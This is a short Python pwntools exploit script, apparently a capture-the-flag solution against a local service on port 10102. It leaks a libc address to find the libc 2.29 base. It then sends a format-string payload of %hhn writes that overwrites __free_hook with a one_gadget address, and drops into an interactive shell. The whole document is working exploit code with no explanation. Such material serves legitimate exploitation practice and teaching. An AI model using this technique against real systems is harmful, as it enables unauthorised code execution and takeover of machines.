from pwn import *

###Addr
#  libc2.29
system_offset = 0x52fd0
free_hook_offset = 0x1e75a8
one_gadget = 0x106ef8

###Exploit
r = remote('127.0.0.1',10102)

r.sendlineafter('name : ','M30W')
r.recvuntil('0x')
system_addr = int(r.recvline(),16)
libc_base = system_addr-system_offset
print(hex(libc_base))

target = []
for i in range(8):
    target.append([((libc_base+one_gadget)>>(i*8))&0xff,libc_base+free_hook_offset+i])

target = sorted(target)
for i in range(7,0,-1):
    target[i][0]-=target[i-1][0]
print(target)

fmt = ''
for i in range(8):
    if target[i][0]==0:
        fmt+=f'%{46+i}$hhn'
    else:
        fmt+=f'%{target[i][0]}c%{46+i}$hhn'
fmt = fmt.encode().ljust(0x100,b'\x00')
for i in range(8):
    fmt+=p64(target[i][1])

r.sendlineafter('Feedback : ',fmt)

r.interactive()
